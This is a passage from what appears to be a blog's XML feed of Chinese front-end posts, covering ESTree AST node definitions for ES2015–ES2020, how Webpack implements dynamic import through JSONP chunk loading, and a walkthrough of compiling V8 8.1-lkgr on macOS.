href="#Statement-语句-1" class="headerlink" title="Statement 语句"></a>Statement 语句</h3><ul><li>ForOf语句 “for (let [left] of [right])”<pre><code class="lang-ts">interface ForOfStatement &lt;: ForInStatement {  type: &quot;ForOfStatement&quot;;}</code></pre></li></ul><h3 id="Declaration-声明"><a href="#Declaration-声明" class="headerlink" title="Declaration 声明"></a>Declaration 声明</h3><ul><li>变量声明<pre><code class="lang-ts">extend interface VariableDeclaration {  kind: &quot;var&quot; | &quot;let&quot; | &quot;const&quot;;}</code></pre></li></ul><h3 id="Expression-表达式-1"><a href="#Expression-表达式-1" class="headerlink" title="Expression 表达式"></a>Expression 表达式</h3><ul><li>Super表达式 “super([arguments])”<pre><code class="lang-ts">interface Super &lt;: Node {  type: &quot;Super&quot;;}extend interface CallExpression {  callee: Expression | Super;}extend interface MemberExpression {  object: Expression | Super;}</code></pre></li><li>Spread表达式 “[head, …iter]”<pre><code class="lang-ts">interface SpreadElement &lt;: Node {  type: &quot;SpreadElement&quot;;  argument: Expression;}extend interface ArrayExpression {  elements: [ Expression | SpreadElement | null ];}extend interface CallExpression {  arguments: [ Expression | SpreadElement ];}extend interface NewExpression {  arguments: [ Expression | SpreadElement ];}</code></pre></li><li>箭头函数表达式 “() =&gt; {[body]}”<pre><code class="lang-ts">interface ArrowFunctionExpression &lt;: Function, Expression {  type: &quot;ArrowFunctionExpression&quot;;  body: FunctionBody | Expression;  expression: boolean;}</code></pre></li><li>Yield表达式 “yield [argument]”<pre><code class="lang-ts">interface YieldExpression &lt;: Expression {  type: &quot;YieldExpression&quot;;  argument: Expression | null;  delegate: boolean;}</code></pre></li><li>模板字面量 “<code>Hello ${name}</code>“<pre><code class="lang-ts">interface TemplateLiteral &lt;: Expression {  type: &quot;TemplateLiteral&quot;;  quasis: [ TemplateElement ];  expressions: [ Expression ];}</code></pre><ul><li>模板元素<pre><code class="lang-ts">interface TemplateElement &lt;: Node {  type: &quot;TemplateElement&quot;;  tail: boolean;  value: {      cooked: string;      raw: string;  };}</code></pre></li></ul></li><li>带标签的模板字符串表达式 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">MDN链接</a><pre><code class="lang-ts">interface TaggedTemplateExpression &lt;: Expression {  type: &quot;TaggedTemplateExpression&quot;;  tag: Expression;  quasi: TemplateLiteral;}</code></pre></li></ul><h3 id="Pattern-模式"><a href="#Pattern-模式" class="headerlink" title="Pattern 模式"></a>Pattern 模式</h3><p>主要跟解构赋值相关</p><ul><li>ObjectPattern “{ a, b: c } = { a: 1, b: { c: 2 }}”<pre><code class="lang-ts">interface AssignmentProperty &lt;: Property {  type: &quot;Property&quot;; // inherited  value: Pattern;  kind: &quot;init&quot;;  method: false;}interface ObjectPattern &lt;: Pattern {  type: &quot;ObjectPattern&quot;;  properties: [ AssignmentProperty ];}</code></pre></li><li>ArrayPattern “[a, b] = [1, 2]”<pre><code class="lang-ts">interface ArrayPattern &lt;: Pattern {  type: &quot;ArrayPattern&quot;;  elements: [ Pattern | null ];}</code></pre></li><li>RestElement “fun(…args){}”<pre><code class="lang-ts">interface RestElement &lt;: Pattern {  type: &quot;RestElement&quot;;  argument: Pattern;}</code></pre></li><li>AssignmentPattern “fun(a=10){}”<pre><code class="lang-ts">interface AssignmentPattern &lt;: Pattern {  type: &quot;AssignmentPattern&quot;;  left: Pattern;  right: Expression;}</code></pre></li></ul><h3 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h3><pre><code class="lang-ts">interface Class &lt;: Node {    id: Identifier | null;    superClass: Expression | null;    body: ClassBody;}</code></pre><ul><li>类主体<pre><code class="lang-ts">interface ClassBody &lt;: Node {  type: &quot;ClassBody&quot;;  body: [ MethodDefinition ];}</code></pre></li><li>方法定义<pre><code class="lang-ts">interface MethodDefinition &lt;: Node {  type: &quot;MethodDefinition&quot;;  key: Expression;  value: FunctionExpression;  kind: &quot;constructor&quot; | &quot;method&quot; | &quot;get&quot; | &quot;set&quot;;  computed: boolean;  static: boolean;}</code></pre></li><li>类声明 “class [name] [extends] {[body]}”<pre><code class="lang-ts">interface ClassDeclaration &lt;: Class, Declaration {  type: &quot;ClassDeclaration&quot;;  id: Identifier;}</code></pre></li><li>类表达式 “const A = class [name] [extends] {[body]}”<pre><code class="lang-ts">interface ClassExpression &lt;: Class, Expression {  type: &quot;ClassExpression&quot;;}</code></pre></li><li>元属性 “new.target”<pre><code class="lang-ts">interface MetaProperty &lt;: Expression {  type: &quot;MetaProperty&quot;;  meta: Identifier;  property: Identifier;}</code></pre></li></ul><h3 id="Module-模块"><a href="#Module-模块" class="headerlink" title="Module 模块"></a>Module 模块</h3><ul><li>模块声明<pre><code class="lang-ts">interface ModuleDeclaration &lt;: Node { }</code></pre></li><li>模块说明符<pre><code class="lang-ts">interface ModuleSpecifier &lt;: Node {  local: Identifier;}</code></pre></li><li>Import<ul><li>导入声明 “import foo from ‘mod’”<pre><code class="lang-ts">interface ImportDeclaration &lt;: ModuleDeclaration {  type: &quot;ImportDeclaration&quot;;  specifiers: [ ImportSpecifier | ImportDefaultSpecifier | ImportNamespaceSpecifier ];  source: Literal;}</code></pre></li><li>导入说明符 “import { foo as a } from ‘mod’”<pre><code class="lang-ts">interface ImportSpecifier &lt;: ModuleSpecifier {  type: &quot;ImportSpecifier&quot;;  imported: Identifier;}</code></pre></li><li>默认导入说明符 “import foo from ‘mod’”<pre><code class="lang-ts">interface ImportDefaultSpecifier &lt;: ModuleSpecifier {  type: &quot;ImportDefaultSpecifier&quot;;}</code></pre></li><li>命名空间导入说明符 “import * as foo from ‘mod’”<pre><code class="lang-ts">interface ImportNamespaceSpecifier &lt;: ModuleSpecifier {  type: &quot;ImportNamespaceSpecifier&quot;;}</code></pre></li></ul></li><li>Exports<ul><li>部分导出声明 “export { foo, bar }” “export var foo = 1”<pre><code class="lang-ts">interface ExportNamedDeclaration &lt;: ModuleDeclaration {  type: &quot;ExportNamedDeclaration&quot;;  declaration: Declaration | null;  specifiers: [ ExportSpecifier ];  source: Literal | null;}</code></pre></li><li>导出说明符 “export { foo }” “export { foo as bar }”<pre><code class="lang-ts">interface ExportSpecifier &lt;: ModuleSpecifier {  type: &quot;ExportSpecifier&quot;;  exported: Identifier;}</code></pre></li><li>默认导出声明 “export default foo”<pre><code class="lang-ts">interface AnonymousDefaultExportedFunctionDeclaration &lt;: Function {  type: &quot;FunctionDeclaration&quot;;  id: null;}interface AnonymousDefaultExportedClassDeclaration &lt;: Class {  type: &quot;ClassDeclaration&quot;;  id: null;}interface ExportDefaultDeclaration &lt;: ModuleDeclaration {  type: &quot;ExportDefaultDeclaration&quot;;  declaration: AnonymousDefaultExportedFunctionDeclaration | FunctionDeclaration | AnonymousDefaultExportedClassDeclaration | ClassDeclaration | Expression;}</code></pre></li><li>全部导出声明 “export * from ‘mod’”<pre><code class="lang-ts">interface ExportAllDeclaration &lt;: ModuleDeclaration {  type: &quot;ExportAllDeclaration&quot;;  source: Literal;}</code></pre></li></ul></li></ul><h2 id="ES2016"><a href="#ES2016" class="headerlink" title="ES2016"></a>ES2016</h2><h3 id="新增二元运算符"><a href="#新增二元运算符" class="headerlink" title="新增二元运算符 **"></a>新增二元运算符 **</h3><pre><code class="lang-ts">extend enum BinaryOperator {    &quot;**&quot;}</code></pre><h3 id="新增赋值运算符"><a href="#新增赋值运算符" class="headerlink" title="新增赋值运算符 **="></a>新增赋值运算符 **=</h3><pre><code class="lang-ts">extend enum AssignmentOperator {    &quot;**=&quot;}</code></pre><h2 id="ES2017"><a href="#ES2017" class="headerlink" title="ES2017"></a>ES2017</h2><h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><pre><code class="lang-ts">extend interface Function {    async: boolean;}interface AwaitExpression &lt;: Expression {    type: &quot;AwaitExpression&quot;;    argument: Expression;}</code></pre><h2 id="ES2018"><a href="#ES2018" class="headerlink" title="ES2018"></a>ES2018</h2><h3 id="异步迭代器-for-await-of"><a href="#异步迭代器-for-await-of" class="headerlink" title="异步迭代器 for-await-of"></a>异步迭代器 for-await-of</h3><pre><code class="lang-ts">extend interface ForOfStatement {  await: boolean;}</code></pre><p>for await (const x of xs) {}</p><h3 id="对象支持-Rest-Spread"><a href="#对象支持-Rest-Spread" class="headerlink" title="对象支持 Rest/Spread"></a>对象支持 Rest/Spread</h3><pre><code class="lang-ts">extend interface ObjectExpression {    properties: [ Property | SpreadElement ];}extend interface ObjectPattern {    properties: [ AssignmentProperty | RestElement ];}</code></pre><p>ES2015 引入了 Rest 参数和 Spread 运算符，但仅作用于数组，ES2018 新增了对 Object 的支持。</p><h3 id="非法转义序列"><a href="#非法转义序列" class="headerlink" title="非法转义序列"></a>非法转义序列</h3><pre><code class="lang-ts">extend interface TemplateElement {    value: {        cooked: string | null;        raw: string;    };}</code></pre><p>ES2018 移除对 ECMAScript 在带标签的模版字符串中转义序列的语法限制。<br>之前，\u 开始一个 unicode 转义，\x 开始一个十六进制转义，\ 后跟一个数字开始一个八进制转义。这使得创建特定的字符串变得不可能，更多细节参考 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#ES2018关于非法转义序列的修订" target="_blank" rel="noopener">MDN</a>。</p><h2 id="ES2019"><a href="#ES2019" class="headerlink" title="ES2019"></a>ES2019</h2><h3 id="Catch-语句允许为空"><a href="#Catch-语句允许为空" class="headerlink" title="Catch 语句允许为空"></a>Catch 语句允许为空</h3><pre><code class="lang-ts">extend interface CatchClause {    param: Pattern | null;}</code></pre><p>try { } catch { }</p><h2 id="ES2020"><a href="#ES2020" class="headerlink" title="ES2020"></a>ES2020</h2><h3 id="BigInt-字面量"><a href="#BigInt-字面量" class="headerlink" title="BigInt 字面量"></a>BigInt 字面量</h3><pre><code class="lang-ts">extend interface Literal &lt;: Expression {    type: &quot;Literal&quot;;    value: string | boolean | null | number | RegExp | bigint;}interface BigIntLiteral &lt;: Literal {    bigint: string;}</code></pre><h3 id="双问号运算符"><a href="#双问号运算符" class="headerlink" title="双问号运算符"></a>双问号运算符</h3><pre><code class="lang-ts">extend enum LogicalOperator {    &quot;||&quot; | &quot;&amp;&amp;&quot; | &quot;??&quot;}</code></pre><h3 id="export-as-语法"><a href="#export-as-语法" class="headerlink" title="export * as 语法"></a>export * as 语法</h3><pre><code class="lang-ts">extend interface ExportAllDeclaration {    exported: Identifier | null;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
      <category term="AST" scheme="https://vincent0700.com/tags/AST/"/>
    
  </entry>
  
  <entry>
    <title>Webpack 动态导入原理</title>
    <link href="https://vincent0700.com/2020/05/22/055_Webpack_dynamic_import/"/>
    <id>https://vincent0700.com/2020/05/22/055_Webpack_dynamic_import/</id>
    <published>2020-05-22T13:00:00.000Z</published>
    <updated>2020-06-12T23:53:07.193Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文主要记录了 Webpack import(‘module’).then(…) 动态导入语法的原理，如果对 Webpack 模块化原理不是很了解，可以参考我之前的文章 <a href="/2020/04/30/051_Webpack_module_principle/">Webpack 模块化原理</a></p></blockquote><h2 id="示例源码"><a href="#示例源码" class="headerlink" title="示例源码"></a>示例源码</h2><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/learning-webpack.git$ cd learning-webpack$ yarn install# 开发$ yarn dev:async# 编译$ yarn build:async</code></pre><h3 id="待打包文件"><a href="#待打包文件" class="headerlink" title="待打包文件"></a>待打包文件</h3><pre><code class="lang-javascript">// src/templates/basic/utils.jsexport const add = (x, y) =&gt; x + y;export const num = 10;export const obj = { a: { b: 1 } };export default {  add,  num,  obj};</code></pre><pre><code class="lang-javascript">// src/templates/basic/hello.jsexport default function(name) {  console.log(`hello ${name}`);}</code></pre><pre><code class="lang-javascript">// src/templates/basic/async_import.jssetTimeout(async () =&gt; {  const utils = await import(/* webpackChunkName: &quot;utils&quot; */ &#39;./utils&#39;);  const hello = await import(/* webpackChunkName: &quot;hello&quot; */ &#39;./hello&#39;);  console.log(utils);  console.log(hello);}, 3000);</code></pre><p>入口文件 <code>async_import.js</code> 会在三秒后引入 <code>utils.js</code>，从语法可以看出 <code>import(...)</code> 的结果是一个 <code>Promise</code> 猜测应该是 <code>Webpack</code> 的 <code>module</code> 对象</p><h3 id="Webpack-配置"><a href="#Webpack-配置" class="headerlink" title="Webpack 配置"></a>Webpack 配置</h3><pre><code class="lang-javascript">// src/examples/webpack.async.jsconst path = require(&#39;path&#39;);const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;);const FriendlyErrorsWebpackPlugin = require(&#39;friendly-errors-webpack-plugin&#39;);module.exports = {  mode: &#39;development&#39;,  entry: path.join(__dirname, &#39;../templates/basic/async_import.js&#39;),  output: {    path: path.join(__dirname, &#39;../../dist&#39;),    filename: &#39;[name].js&#39;  },  plugins: [new HtmlWebpackPlugin(), new FriendlyErrorsWebpackPlugin()],  devServer: {    contentBase: path.join(__dirname, &#39;../../dist&#39;),    compress: true,    port: 9000  }};</code></pre><h2 id="打包结果"><a href="#打包结果" class="headerlink" title="打包结果"></a>打包结果</h2><p>我格式化并删减了一写注释，得到的 <code>utils.js</code> 内容如下:</p><pre><code class="lang-javascript">(window[&#39;webpackJsonp&#39;] = window[&#39;webpackJsonp&#39;] || []).push([  [&#39;utils&#39;],  {    &#39;./src/templates/basic/utils.js&#39;: function(module, __webpack_exports__, __webpack_require__) {      eval(`      __webpack_require__.r(__webpack_exports__);      __webpack_require__.d(__webpack_exports__, &quot;add&quot;, function() { return add; });__webpack_require__.d(__webpack_exports__, &quot;num&quot;, function() { return num; });__webpack_require__.d(__webpack_exports__, &quot;obj&quot;, function() { return obj; });      const add = (x, y) =&gt; x + y;      const num = 10;      const obj = { a: { b: 1 } };      __webpack_exports__[&quot;default&quot;] = ({ add, num, obj });    `);    }  }]);</code></pre><p>得到的 <code>main.js</code> 文件内容如下：</p><pre><code class="lang-javascript">(function(modules) {  // webpackBootstrap  // install a JSONP callback for chunk loading  function webpackJsonpCallback(data) {    var chunkIds = data[0];    var moreModules = data[1];    // add &quot;moreModules&quot; to the modules object,    // then flag all &quot;chunkIds&quot; as loaded and fire callback    var moduleId,      chunkId,      i = 0,      resolves = [];    for (; i &lt; chunkIds.length; i++) {      chunkId = chunkIds[i];      if (        Object.prototype.hasOwnProperty.call(installedChunks, chunkId) &amp;&amp;        installedChunks[chunkId]      ) {        resolves.push(installedChunks[chunkId][0]);      }      installedChunks[chunkId] = 0;    }    for (moduleId in moreModules) {      if (Object.prototype.hasOwnProperty.call(moreModules, moduleId)) {        modules[moduleId] = moreModules[moduleId];      }    }    if (parentJsonpFunction) parentJsonpFunction(data);    while (resolves.length) {      resolves.shift()();    }  }  // The module cache  var installedModules = {};  // object to store loaded and loading chunks  // undefined = chunk not loaded, null = chunk preloaded/prefetched  // Promise = chunk loading, 0 = chunk loaded  var installedChunks = {    main: 0  };  // script path function  function jsonpScriptSrc(chunkId) {    return __webpack_require__.p + &#39;&#39; + ({ utils: &#39;utils&#39; }[chunkId] || chunkId) + &#39;.js&#39;;  }  // The require function  function __webpack_require__(moduleId) {    // Check if module is in cache    if (installedModules[moduleId]) {      return installedModules[moduleId].exports;    }    // Create a new module (and put it into the cache)    var module = (installedModules[moduleId] = {      i: moduleId,      l: false,      exports: {}    });    // Execute the module function    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);    // Flag the module as loaded    module.l = true;    // Return the exports of the module    return module.exports;  }  // This file contains only the entry chunk.  // The chunk loading function for additional chunks  __webpack_require__.e = function requireEnsure(chunkId) {    var promises = [];    // JSONP chunk loading for javascript    var installedChunkData = installedChunks[chunkId];    if (installedChunkData !== 0) {      // 0 means &quot;already installed&quot;.      // a Promise means &quot;currently loading&quot;.      if (installedChunkData) {        promises.push(installedChunkData[2]);      } else {        // setup Promise in chunk cache        var promise = new Promise(function(resolve, reject) {          installedChunkData = installedChunks[chunkId] = [resolve, reject];        });        promises.push((installedChunkData[2] = promise));        // start chunk loading        var script = document.createElement(&#39;script&#39;);        var onScriptComplete;        script.charset = &#39;utf-8&#39;;        script.timeout = 120;        if (__webpack_require__.nc) {          script.setAttribute(&#39;nonce&#39;, __webpack_require__.nc);        }        script.src = jsonpScriptSrc(chunkId);        // create error before stack unwound to get useful stacktrace later        var error = new Error();        onScriptComplete = function(event) {          // avoid mem leaks in IE.          script.onerror = script.onload = null;          clearTimeout(timeout);          var chunk = installedChunks[chunkId];          if (chunk !== 0) {            if (chunk) {              var errorType = event &amp;&amp; (event.type === &#39;load&#39; ? &#39;missing&#39; : event.type);              var realSrc = event &amp;&amp; event.target &amp;&amp; event.target.src;              error.message =                &#39;Loading chunk &#39; + chunkId + &#39; failed.\n(&#39; + errorType + &#39;: &#39; + realSrc + &#39;)&#39;;              error.name = &#39;ChunkLoadError&#39;;              error.type = errorType;              error.request = realSrc;              chunk[1](error);            }            installedChunks[chunkId] = undefined;          }        };        var timeout = setTimeout(function() {          onScriptComplete({ type: &#39;timeout&#39;, target: script });        }, 120000);        script.onerror = script.onload = onScriptComplete;        document.head.appendChild(script);      }    }    return Promise.all(promises);  };  // expose the modules object (__webpack_modules__)  __webpack_require__.m = modules;  // expose the module cache  __webpack_require__.c = installedModules;  // define getter function for harmony exports  __webpack_require__.d = function(exports, name, getter) {    if (!__webpack_require__.o(exports, name)) {      Object.defineProperty(exports, name, { enumerable: true, get: getter });    }  };  // define __esModule on exports  __webpack_require__.r = function(exports) {    if (typeof Symbol !== &#39;undefined&#39; &amp;&amp; Symbol.toStringTag) {      Object.defineProperty(exports, Symbol.toStringTag, { value: &#39;Module&#39; });    }    Object.defineProperty(exports, &#39;__esModule&#39;, { value: true });  };  // create a fake namespace object  // mode &amp; 1: value is a module id, require it  // mode &amp; 2: merge all properties of value into the ns  // mode &amp; 4: return value when already ns object  // mode &amp; 8|1: behave like require  __webpack_require__.t = function(value, mode) {    if (mode &amp; 1) value = __webpack_require__(value);    if (mode &amp; 8) return value;    if (mode &amp; 4 &amp;&amp; typeof value === &#39;object&#39; &amp;&amp; value &amp;&amp; value.__esModule) return value;    var ns = Object.create(null);    __webpack_require__.r(ns);    Object.defineProperty(ns, &#39;default&#39;, { enumerable: true, value: value });    if (mode &amp; 2 &amp;&amp; typeof value != &#39;string&#39;)      for (var key in value)        __webpack_require__.d(          ns,          key,          function(key) {            return value[key];          }.bind(null, key)        );    return ns;  };  // getDefaultExport function for compatibility with non-harmony modules  __webpack_require__.n = function(module) {    var getter =      module &amp;&amp; module.__esModule        ? function getDefault() {            return module[&#39;default&#39;];          }        : function getModuleExports() {            return module;          };    __webpack_require__.d(getter, &#39;a&#39;, getter);    return getter;  };  // Object.prototype.hasOwnProperty.call  __webpack_require__.o = function(object, property) {    return Object.prototype.hasOwnProperty.call(object, property);  };  // __webpack_public_path__  __webpack_require__.p = &#39;&#39;;  // on error function for async loading  __webpack_require__.oe = function(err) {    console.error(err);    throw err;  };  var jsonpArray = (window[&#39;webpackJsonp&#39;] = window[&#39;webpackJsonp&#39;] || []);  var oldJsonpFunction = jsonpArray.push.bind(jsonpArray);  jsonpArray.push = webpackJsonpCallback;  jsonpArray = jsonpArray.slice();  for (var i = 0; i &lt; jsonpArray.length; i++) webpackJsonpCallback(jsonpArray[i]);  var parentJsonpFunction = oldJsonpFunction;  // Load entry module and return exports  return __webpack_require__((__webpack_require__.s = &#39;./src/templates/basic/async_import.js&#39;));})({  &#39;./src/templates/basic/async_import.js&#39;: function(module, exports, __webpack_require__) {    eval(`      setTimeout(async () =&gt; {        const utils = await __webpack_require__.e(&quot;utils&quot;).then(          __webpack_require__.bind(null, &quot;./src/templates/basic/utils.js&quot;)        );        console.log(utils);        const result = utils.add(1, 2);        console.log(result);      }, 3000)    `);  }});</code></pre><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从代码中可以发现, <code>import(&#39;utils&#39;)</code> 被翻译成了</p><pre><code>__webpack_require__.e(&#39;utils&#39;)  .then(__webpack_require__.bind(null, &#39;./src/templates/basic/utils.js&#39;));</code></pre><p>从我之前的文章 <a href="/2020/04/30/051_Webpack_module_principle/">Webpack 模块化原理</a> 中可以知道 <code>__webpack_require__(moduleId)</code> 会先读取缓存，如果缓存没有命中，就会从 <code>modules</code> 加载并执行, 现在被嵌入到 <code>__webpack_require__.e(&#39;utils&#39;)</code> 的 <code>Promise</code> 回调中, 所以 <code>__webpack_require__.e(&#39;utils&#39;)</code> 应该会异步加载 <code>utils.js</code> 到 <code>modules</code> 对象, 然后被 <code>__webpack_require__</code> 引入执行。</p><p>那么 <code>Webpack</code> 是如何实现异步加载的呢？我们来看一下 <code>__webpack_require__.e</code> 的部分代码：</p><pre><code class="lang-javascript">var script = document.createElement(&#39;script&#39;);var onScriptComplete;script.charset = &#39;utf-8&#39;;script.timeout = 120;script.src = jsonpScriptSrc(chunkId);onScriptComplete = function(event) {  // ...};var timeout = setTimeout(function() {  onScriptComplete({ type: &#39;timeout&#39;, target: script });}, 120000);script.onerror = script.onload = onScriptComplete;document.head.appendChild(script);</code></pre><p>明白了么？<code>Webpack</code> 其实是通过 <code>jsonp</code> 的方式来实现模块的动态加载的。下面我们来看看 <code>chunk</code> 部分：</p><pre><code>(window[&#39;webpackJsonp&#39;] = window[&#39;webpackJsonp&#39;] || []).push([  [&#39;utils&#39;], {    &#39;./src/templates/basic/utils.js&#39;:    function(module, __webpack_exports__, __webpack_require__) {      ...    }  }]);</code></pre><p>不难发现，通过 <code>script</code> 引入的模块代码最终会挂载 <code>window.webpackJsonp</code> 上，我们看一下这个变量的结构：</p><pre><code>// webpack.webpackJsonp[  0: [    [&quot;utils&quot;],    {./src/templates/basic/utils.js: ƒ}  ],  1: [    [&quot;hello&quot;],    {./src/templates/basic/hello.js: ƒ}  ],  push: f webpackJsonpCallback(data)]</code></pre><p>我觉得这里 <code>Webpack</code> 可能忽视了一个问题，因为这里模块代码是通过全局变量和入口模块进行通信的，就不可避免的会遇变量被污染的情况，我试了下，如果在全局先定义了 <code>webpackJsonp = 1</code>，那么后续所有动态引入的模块都无法被加载。</p><p>最后我转一张掘金上看到的图，展示 <code>Webpack</code> 异步加载的流程，<a href="https://juejin.im/post/5d26e7d1518825290726f67a" target="_blank" rel="noopener">文章链接</a></p><img src="/2020/05/22/055_Webpack_dynamic_import/flowchart.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Webpack" scheme="https://vincent0700.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>V8 编译踩坑 (v8.1-lkgr)</title>
    <link href="https://vincent0700.com/2020/05/18/054_V8_compilation/"/>
    <id>https://vincent0700.com/2020/05/18/054_V8_compilation/</id>
    <published>2020-05-18T13:00:00.000Z</published>
    <updated>2021-03-06T02:54:47.807Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="编译版本"><a href="#编译版本" class="headerlink" title="编译版本"></a>编译版本</h2><p>由于当前 <code>Chrome</code> 最新稳定版本是 <code>Chrome 81</code>, 我们可以通过 <code>chrome://version</code> 查看，发现当前 <code>Chrome</code> 依赖的 <code>v8</code> 版本是 <code>8.1.307.32</code>。</p><img src="/2020/05/18/054_V8_compilation/chrome_version.png"><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装-depot-tools"><a href="#安装-depot-tools" class="headerlink" title="安装 depot_tools"></a>安装 depot_tools</h3><p>我们所需的 <code>gn</code> (配置生成工具) 和 <code>nijia</code> (构建工具) 都在这个仓库里。</p><pre><code class="lang-bash"># Clone depot_tools 仓库 $ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git# 导出环境变量$ export PATH=&quot;$PATH:/path/to/depot_tools&quot;</code></pre><h3 id="下载所需依赖"><a href="#下载所需依赖" class="headerlink" title="下载所需依赖"></a>下载所需依赖</h3><pre><code class="lang-bash">$ mkdir v8_build &amp;&amp; cd v8_build# 配置 v8 仓库$ gclient config https://chromium.googlesource.com/v8/v8# 需要科学上网，然后等待很长一段时间...$ gclient sync</code></pre><p>结束了之后，就会看到 <code>v8</code> 的仓库文件夹，配置一下 <code>v8gen.py</code> 的别名。</p><pre><code class="lang-bash">$ alias v8gen=/path/to/v8/tools/v8gen.py</code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>首先切换到我们需要编译的分支 <code>8.1-lkgr</code>，<code>lkgr</code> 是最新通过测试的稳定版本，看下日志发现就是最新 <code>Chrome</code> 引用的 <code>v8</code> 版本 <code>8.1.307.32</code>。</p><pre><code class="lang-bash">$ git checkout 8.1-lkgr</code></pre><p>我们目的是编译出静态库 <code>v8_monolith</code> 供我们的 <code>C++</code> 程序引用，按照官方教程走，这里需要 <code>python 2</code> 的环境，我用 <code>pyenv</code> 安装了 <code>2.7.17</code> 的版本，然后在 <code>v8</code> 目录下执行。</p><pre><code class="lang-bash">$ v8gen -vv x64.release.sample&#39;&#39;&#39;Traceback (most recent call last):  File &quot;/Users/Vincent/Common/v8/build/mac/find_sdk.py&quot;, line 97, in &lt;module&gt;    print(main())  File &quot;/Users/Vincent/Common/v8/build/mac/find_sdk.py&quot;, line 80, in main    raise Exception(&#39;No %s+ SDK found&#39; % min_sdk_version)Exception: No 10.15+ SDK found</code></pre><p>这里报了个错误，说我们没有 <code>10.15</code> 的 <code>SDK</code>，可是我用的是 <code>Mojave</code> (滑稽)，看着 <code>min_sdk_version</code> 这个变量是写死在分支的文件里的，于是我修改了一下。</p><pre><code class="lang-gni"># build/config/mac/mac_sdk_overrides.gni_sdk_min_from_env = getenv(&quot;FORCE_MAC_SDK_MIN&quot;)declare_args() {  # Minimum supported version of the Mac SDK.  if (_sdk_min_from_env == &quot;&quot;) {    mac_sdk_min = &quot;10.15&quot; # 将这里修改成了10.14  } else {    mac_sdk_min = _sdk_min_from_env  }}</code></pre><p>修改后再次执行，Done.</p><pre><code class="lang-bash">$ v8gen -vv x64.release.sample&#39;&#39;&#39;/Users/Vincent/.pyenv/versions/2.7.17/bin/python -u tools/mb/mb.py gen -f infra/mb/mb_config.pyl -m developer_default -b x64.release.sample out.gn/x64.release.sample  Writing &quot;&quot;&quot;\  is_component_build = false  is_debug = false  target_cpu = &quot;x64&quot;  use_custom_libcxx = false  v8_monolithic = true  v8_use_external_startup_data = false  &quot;&quot;&quot; to /Users/Vincent/Common/v8/out.gn/x64.release.sample/args.gn.  /Users/Vincent/Common/v8/buildtools/mac/gn gen out.gn/x64.release.sample --check  Done. Made 140 targets from 81 files in 753ms</code></pre><p>下面开始构建，不出意外的话应该会报下面的错。</p><pre><code class="lang-bash">$ ninja -C out.gn/x64.release.sample v8_monolith&#39;&#39;&#39;FAILED: obj/v8_base_without_compiler/js-number-format.o../../src/objects/js-number-format.cc:1227:15: error: no member named &#39;getAllFieldPositions&#39; in &#39;icu_67::number::FormattedNumber&#39;    formatted.getAllFieldPositions(*fp_iter, status);    ~~~~~~~~~ ^1 error generated.ninja: build stopped: subcommand failed.</code></pre><p>看一下这个文件 <code>js-number-format.cc</code>，发现确实没有 <code>getAllFieldPositions</code> 这个函数的实现。我切了 <code>8.0-lkgr</code>, <code>7.9-lkgr</code>, <code>7.8-lkgr</code> 这几个分支，发现编译都会报这个错，查了一下官方的 <a href="https://bugs.chromium.org/p/v8/issues/detail?id=10393" target="_blank" rel="noopener"><code>issue</code></a>，发现 <code>icu67</code> 移除了 <code>getAllFieldPositions</code> 这个 <code>API</code>，需要后续添加一个 <code>icu67.1</code> 的 <code>patch</code>。</p><img src="/2020/05/18/054_V8_compilation/bug.png"><p><a href="http://site.icu-project.org/download/67" target="_blank" rel="noopener"><code>ICU</code></a> 是一个国际化模块，<a href="https://github.com/unicode-org/icu/releases/tag/release-67-1" target="_blank" rel="noopener">下载地址</a>。</p><p>这个 <code>bug</code> 已在 <code>2020/04/07</code> 的一次 <a href="https://chromium.googlesource.com/v8/v8/+/3f8dc4b2e5baf77b463334c769af85b79d8c1463" target="_blank" rel="noopener"><code>Commit</code></a> 修复，这里我们直接 <code>cherry-pick</code> 会有冲突，但是又不想用太新的没有测试过的版本，反正也用不到国际化的模块，所以就将 <code>i18n</code> 从编译选项中移除了，方法如下：</p><pre><code class="lang-bash"># 编辑配置$ gn args out.gn/x64.release.sample# 增加一行：# v8_enable_i18n_support = false# 再次构建$ ninja -C out.gn/x64.release.sample v8_monolith</code></pre><h2 